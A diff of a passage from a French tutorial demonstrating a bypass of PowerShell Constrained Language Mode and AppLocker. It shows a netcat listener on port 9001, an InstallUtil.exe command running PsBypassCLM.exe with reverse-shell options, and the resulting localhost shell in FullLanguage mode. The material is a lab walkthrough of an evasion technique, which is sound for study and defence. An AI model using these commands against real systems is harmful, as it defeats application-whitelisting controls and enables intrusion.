@@ -87,19 +87,24 @@ Reverse Shell
 ----
 Donc nous arrivons presque à la fin pour effectuer notre reverse shell, nous allons utiliser l'outil `InstallUtil.exe` dans le même dossier que `MSBuild.exe`. Avant ça je vais crée un `listener` qui écoute le port `9001`.
 
-![Flower](https://image.noelshack.com/fichiers/2019/23/1/1559585369-screenshot-1.png)
+    PS C:\Users\Administrateur\Desktop\netcat-1.11> nc.exe -lvnp 9001
+    listening on [any] 9001 ...
 
 Et enfin de saisir cette commande pour effectuer notre reverse shell et être en mode `FullLanguage` dans notre système PowerShell (that's cool) : 
 
     PS C:\Windows\Microsoft.NET\Framework64\v4.0.30319> .\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=localhost /rport=9001 /U c:\windows\temp\PsBypassCLM.exe
 
-Ah oui un détail assez important n'oublier surtout pas de mettre le fichier `PsBypassCLM.exe` dans `C:\Windows\temp\PsBypassCLM.exe` pour Bypass `AppLocker`.
+Ah oui un détail assez important n'oublier surtout pas de mettre le fichier `PsBypassCLM.exe` dans `C:\Windows\temp\PsBypassCLM.exe` car dans certaines configuration on peut `BYPASS` le système `AppLocker`.
 
 ![Flower](https://image.noelshack.com/fichiers/2019/23/1/1559585660-screenshot-2.png)
 
 Et enfin pendant ce temps là dans notre `listener` j'ai accès à un shell en mode `FullLanguage` et pour pouvoir exécuter des commandes dans le système.
 
-![Flower](https://image.noelshack.com/fichiers/2019/23/1/1559585801-screenshot-3.png)
+    PS C:\Users\Administrateur\Desktop\netcat-1.11> nc.exe -lvnp 9001
+    listening on [any] 9001 ...
+    connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 60002
+    PS C:\Windows\System32> $ExecutionContext.SessionState.LanguageMode
+    FullLanguage
 
-C'est un tutorial assez simple et assez rapide, pour vous présentez le fonctionnement de ce système.
-
+CONCLUSION
+----
